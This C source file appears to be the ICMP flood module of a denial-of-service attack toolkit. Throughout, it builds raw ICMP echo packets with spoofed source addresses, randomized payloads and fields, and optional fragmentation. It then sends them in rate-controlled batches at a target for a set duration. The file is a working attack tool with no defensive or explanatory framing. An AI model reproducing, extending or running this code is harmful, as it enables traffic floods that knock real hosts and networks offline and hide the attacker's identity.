#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <poll.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include "icmp_method.h"
#include "../headers/protocol.h"
#include "../headers/attack_core.h"

#define ICMP_DEFAULT_PAYLOAD 1400
#define ICMP_MAX_PAYLOAD 65500

static inline uint16_t icmp_checksum(void* data, size_t len) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(uint8_t*)ptr;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

void* icmp_method(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = create_raw_socket();
    if (fd < 0) return NULL;

    attack_rand_init();

    uint8_t rand_level = get_rand_level(params);
    uint8_t ttl = get_ttl(params);
    uint8_t tos = get_tos(params);
    uint8_t frag_mode = get_frag_mode(params);
    spoof_config_t spoof = parse_spoof_option(params);

    uint16_t psize = get_packet_size(params, ICMP_DEFAULT_PAYLOAD);
    if (psize > ICMP_MAX_PAYLOAD) psize = ICMP_MAX_PAYLOAD;
    if (psize < 8) psize = 8;

    size_t total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + psize;

    char* packet = (char*)malloc(total_len);
    if (!packet) {
        close(fd);
        return NULL;
    }
    memset(packet, 0, total_len);

    struct iphdr* ip = (struct iphdr*)packet;
    struct icmphdr* icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
    uint8_t* payload = (uint8_t*)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

    for (uint16_t i = 0; i < psize; i++) {
        payload[i] = attack_rand_next() & 0xFF;
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    time_t end_time = time(NULL) + params->duration;
    uint16_t seq = 0;
    int time_check_counter = 0;

    pps_tracker_t pps;
    pps_tracker_init(&pps, get_pps_limit(params));

    char* packets[BATCH_SIZE];
    struct mmsghdr msgvec[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];

    for (int i = 0; i < BATCH_SIZE; i++) {
        packets[i] = (char*)malloc(total_len);
        if (!packets[i]) {
            for (int j = 0; j < i; j++) free(packets[j]);
            free(packet);
            close(fd);
            return NULL;
        }
        memcpy(packets[i], packet, total_len);

        iov[i].iov_base = packets[i];
        iov[i].iov_len = total_len;

        memset(&msgvec[i], 0, sizeof(msgvec[i]));
        msgvec[i].msg_hdr.msg_name = &dest;
        msgvec[i].msg_hdr.msg_namelen = sizeof(dest);
        msgvec[i].msg_hdr.msg_iov = &iov[i];
        msgvec[i].msg_hdr.msg_iovlen = 1;
    }

    free(packet);

    while (params->active) {
        if (!pps_should_send(&pps, BATCH_SIZE)) {
            long sleep_time = pps_sleep_us(&pps);
            if (sleep_time > 0) usleep(sleep_time);
            if (++time_check_counter > 2000) { time_check_counter = 0; if (time(NULL) > end_time) break; }
            continue;
        }
        for (int i = 0; i < BATCH_SIZE && params->active; i++) {
            struct iphdr* bip = (struct iphdr*)packets[i];
            struct icmphdr* bicmp = (struct icmphdr*)(packets[i] + sizeof(struct iphdr));
            uint8_t* bpayload = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct icmphdr));

            bicmp->type = ICMP_ECHO;
            bicmp->code = 0;
            bicmp->un.echo.id = htons(attack_rand_next() & 0xFFFF);
            bicmp->un.echo.sequence = htons(seq++);

            if (rand_level >= RAND_MEDIUM) {
                for (uint16_t p = 0; p < (psize < 64 ? psize : 64); p++) {
                    bpayload[p] = attack_rand_next() & 0xFF;
                }
            }

            bicmp->checksum = 0;
            bicmp->checksum = icmp_checksum(bicmp, sizeof(struct icmphdr) + psize);

            uint32_t src_ip = generate_spoofed_ip(&spoof);
            build_ip_header(bip, src_ip, params->target_addr.sin_addr.s_addr, IPPROTO_ICMP, total_len, rand_level >= RAND_FULL ? attack_rand_next_range(48, 128) : ttl, tos);
            if (frag_mode != FRAG_NONE) apply_ip_frag(bip, frag_mode);
        }

        int sent = sendmmsg_nonblock(fd, msgvec, BATCH_SIZE);
        if (sent == 0) {
            sched_yield();
        }

        if (++time_check_counter > 2000) {
            time_check_counter = 0;
            if (time(NULL) > end_time) break;
        }
    }

    for (int i = 0; i < BATCH_SIZE; i++) {
        free(packets[i]);
    }
    close(fd);

    return NULL;
}
